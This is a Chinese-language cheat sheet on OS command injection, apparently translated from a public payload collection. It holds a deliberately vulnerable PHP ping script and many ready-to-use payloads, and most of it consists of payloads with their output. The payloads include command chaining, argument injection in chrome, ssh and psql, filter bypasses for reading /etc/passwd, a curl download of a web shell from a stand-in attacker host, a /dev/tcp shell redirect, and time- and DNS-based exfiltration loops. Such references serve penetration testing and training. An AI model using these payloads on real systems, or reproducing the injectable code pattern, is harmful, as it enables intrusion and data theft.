# 命令注入

[原文文档](README.en.md)

> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序内执行任意命令。

## 概要

* [工具](#工具)
* [方法论](#方法论)
    * [基本命令](#基本命令)
    * [命令链式执行](#命令链式执行)
    * [参数注入](#参数注入)
    * [在命令内部](#在命令内部)
* [过滤器绕过](#过滤器绕过)
    * [无空格绕过](#无空格绕过)
    * [使用换行符绕过](#使用换行符绕过)
    * [使用反斜杠换行绕过](#使用反斜杠换行绕过)
    * [使用波浪号扩展绕过](#使用波浪号扩展绕过)
    * [使用大括号扩展绕过](#使用大括号扩展绕过)
    * [绕过字符过滤器](#绕过字符过滤器)
    * [通过十六进制编码绕过字符过滤器](#通过十六进制编码绕过字符过滤器)
    * [使用单引号绕过](#使用单引号绕过)
    * [使用双引号绕过](#使用双引号绕过)
    * [使用反引号绕过](#使用反引号绕过)
    * [使用反斜杠和斜杠绕过](#使用反斜杠和斜杠绕过)
    * [使用 $@ 绕过](#使用--绕过)
    * [使用 $() 绕过](#使用--绕过)
    * [使用变量扩展绕过](#使用变量扩展绕过)
    * [使用通配符绕过](#使用通配符绕过)
    * [使用随机大小写绕过](#使用随机大小写绕过)
* [数据泄露](#数据泄露)
    * [基于时间的数据泄露](#基于时间的数据泄露)
    * [基于 DNS 的数据泄露](#基于-dns-的数据泄露)
* [多语言命令注入](#多语言命令注入)
* [技巧](#技巧)
    * [后台运行长时间运行的命令](#后台运行长时间运行的命令)
    * [在注入后移除参数](#在注入后移除参数)
* [实验室](#实验室)
    * [挑战](#挑战)
* [参考资料](#参考资料)

## 工具

* [commixproject/commix](https://github.com/commixproject/commix) - 自动化一体化操作系统命令注入和利用工具
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - 带外交互收集服务器和客户端库

## 方法论

命令注入，也称为 shell 注入，是一种攻击类型，攻击者可以通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供数据（表单、cookie、HTTP 头等）传递给系统 shell 时，此漏洞可能存在。在这种上下文中，系统 shell 是一个命令行接口，处理要执行的命令，通常在 Unix 或 Linux 系统上。

命令注入的危险在于它可能允许攻击者在系统上执行任何命令，可能导致完全系统妥协。

**使用 PHP 进行命令注入的示例**：
假设您有一个 PHP 脚本，它接受用户输入来 ping 指定的 IP 地址或域名：

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

在上面的代码中，PHP 脚本使用 `system()` 函数执行 `ping` 命令，该命令使用用户通过 `ip` GET 参数提供的 IP 地址或域名。

如果攻击者提供像 `8.8.8.8; cat /etc/passwd` 这样的输入，实际执行的命令将是：`ping -c 4 8.8.8.8; cat /etc/passwd`。

这意味着系统将首先 `ping 8.8.8.8`，然后执行 `cat /etc/passwd` 命令，该命令将显示 `/etc/passwd` 文件的内容，可能泄露敏感信息。

### 基本命令

执行命令，就这样 :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```

### 命令链式执行

在许多命令行界面中，特别是在类似 Unix 的系统中，有几个字符可用于链式执行或操作命令。

* `;` (分号)：允许您顺序执行多个命令。
* `&&` (AND)：仅当第一个命令成功（返回零退出状态）时执行第二个命令。
* `||` (OR)：仅当第一个命令失败（返回非零退出状态）时执行第二个命令。
* `&` (后台)：在后台执行命令，允许用户继续使用 shell。
* `|` (管道)：获取第一个命令的输出并将其用作第二个命令的输入。

```powershell
command1; command2   # 执行 command1 然后执行 command2
command1 && command2 # 仅当 command1 成功时才执行 command2
command1 || command2 # 仅当 command1 失败时才执行 command2
command1 & command2  # 在后台执行 command1
command1 | command2  # 将 command1 的输出管道到 command2
```

### 参数注入

当您只能向现有命令追加参数时，获得命令执行。
使用此网站 [参数注入向量 - Sonar](https://sonarsource.github.io/argument-injection-vectors/) 找到要注入的参数以获得命令执行。

* Chrome

    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH

    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql

    ```ps1
    psql -o'|id>/tmp/foo'
    ```

参数注入可以使用 [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) 技术进行滥用。

在下面的示例中，载荷 `＂ --use-askpass=calc ＂` 使用**全角双引号**（U+FF02）而不是**常规双引号**（U+0022）

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

有时，从注入中直接执行命令可能不可能，但您可能能够将流重定向到特定文件，使您能够部署 web shell。

* curl

    ```ps1
    # -o, --output <file>        写入文件而不是 stdout
    curl http://evil.attacker.com/ -o webshell.php
    ```

### 在命令内部

* 使用反引号的命令注入。

  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```

* 使用替换的命令注入

  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```

## 过滤器绕过

### 无空格绕过

* `$IFS` 是一个称为内部字段分隔符的特殊 shell 变量。默认情况下，在许多 shell 中，它包含空白字符（空格、制表符、换行符）。在命令中使用时，shell 会将 `$IFS` 解释为空格。`$IFS` 在像 `ls`、`wget` 这样的命令中不能直接用作分隔符；改用 `${IFS}`。

  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```

* 在某些 shell 中，大括号扩展生成任意字符串。执行时，shell 会将大括号内的项目视为独立的命令或参数。

  ```powershell
  {cat,/etc/passwd}
  ```

* 输入重定向。< 字符告诉 shell 读取指定文件的内容。

  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```

* ANSI-C 引用

  ```powershell
  X=$'uname\x20-a'&&$X
  ```

* 制表符字符有时可以用作空格的替代。在 ASCII 中，制表符字符由十六进制值 `09` 表示。

  ```powershell
  ;ls%09-al%09/home
  ```

* 在 Windows 中，`%VARIABLE:~start,length%` 是用于对环境变量进行子字符串操作的语法。

  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```

### 使用换行符绕过

命令也可以通过换行符顺序运行

```bash
original_cmd_by_server
ls
```

### 使用反斜杠换行绕过

* 可以通过使用反斜杠后跟换行符将命令分解为部分

  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```

* URL 编码形式看起来像这样：

  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```

### 使用波浪号扩展绕过

```powershell
echo ~+
echo ~-
```

### 使用大括号扩展绕过

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```

### 绕过字符过滤器

在 linux bash 中无反斜杠和斜杠执行命令

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### 通过十六进制编码绕过字符过滤器

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### 使用单引号绕过

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### 使用双引号绕过

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### 使用反引号绕过

```powershell
wh``oami
```

### 使用反斜杠和斜杠绕过

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### 使用 $@ 绕过

`$0`：如果脚本作为脚本运行，则指的是脚本的名称。如果您在交互式 shell 会话中，`$0` 通常会给出 shell 的名称。

```powershell
who$@ami
echo whoami|$0
```

### 使用 $() 绕过

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### 使用变量扩展绕过

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### 使用通配符绕过

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

### 使用随机大小写绕过

Windows 在解释命令或文件路径时不区分大小写字母。例如，`DIR`、`dir` 或 `DiR` 都会执行相同的 `dir` 命令。

```powershell
wHoAmi
```

## 数据泄露

### 基于时间的数据泄露

逐字符提取数据并基于延迟检测正确值。

* 正确值：等待 5 秒

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* 错误值：无延迟

  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```

### 基于 DNS 的数据泄露

基于 [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin) 工具，也托管在 [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. 转到 [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
2. 执行一个简单的 'ls'

  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

检查基于 DNS 的数据泄露的在线工具：

* [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
* [app.interactsh.com](https://app.interactsh.com)
* [portswigger.net](https://portswigger.net/burp/documentation/collaborator)

## 多语言命令注入

多语言是在多个编程语言或环境中同时有效和可执行的代码片段。当我们谈论"多语言命令注入"时，我们指的是可以在多个上下文或环境中执行的注入载荷。

* 示例 1：

  ```powershell
  载荷: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # 在带单引号和双引号的命令中的上下文：
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```

* 示例 2：

  ```powershell
  载荷: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # 在带单引号和双引号的命令中的上下文：
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```

## 技巧

### 后台运行长时间运行的命令

在某些情况下，您可能有一个长时间运行的命令，它会被注入它的进程超时终止。
使用 `nohup`，您可以在父进程退出后保持进程运行。

```bash
nohup sleep 120 > /dev/null &
```

### 在注入后移除参数

在类似 Unix 的命令行界面中，`--` 符号用于表示命令选项的结束。在 `--` 之后，所有参数都被视为文件名和参数，而不是选项。

## 实验室

* [PortSwigger - 操作系统命令注入，简单案例](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [PortSwigger - 带时间延迟的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [PortSwigger - 带输出重定向的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [PortSwigger - 带带外交互的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [PortSwigger - 带带外数据泄露的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
* [Root Me - PHP - 命令注入](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
* [Root Me - 命令注入 - 过滤器绕过](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

### 挑战

基于前面技巧的挑战，以下命令的作用是什么：

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

**注意**：此命令可以安全运行，但您不应该信任我。

## 参考资料

* [参数注入和绕过 Shellwords.escape - Etienne Stalmans - 2019年11月24日](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
* [参数注入向量 - SonarSource - 2023年2月21日](https://sonarsource.github.io/argument-injection-vectors/)
* [回到未来：Unix 通配符失控 - Leon Juranic - 2014年6月25日](https://www.exploit-db.com/papers/33930)
* [通过字符串操作进行 Bash 混淆 - Malwrologist，@DissectMalware - 2018年8月4日](https://twitter.com/DissectMalware/status/1025604382644232192)
* [漏洞赏金调查 - Windows RCE 无空格 - 漏洞赏金调查 - 2017年5月4日](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
* [无 PHP、无空格、无 $、无 {}、仅 Bash - Sven Morgenroth - 2017年8月9日](https://twitter.com/asdizzle_/status/895244943526170628)
* [操作系统命令注入 - PortSwigger - 2024年](https://portswigger.net/web-security/os-command-injection)
* [安全咖啡馆 - 利用基于时间的 RCE - Pobereznicenco Dan - 2017年2月28日](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [TL;DR：如何利用/绕过/使用 PHP escapeshellarg/escapeshellcmd 函数 - kacperszurek - 2018年4月25日](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
* [WorstFit：揭示 Windows ANSI 中的隐藏转换器！ - Orange Tsai - 2025年1月10日](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)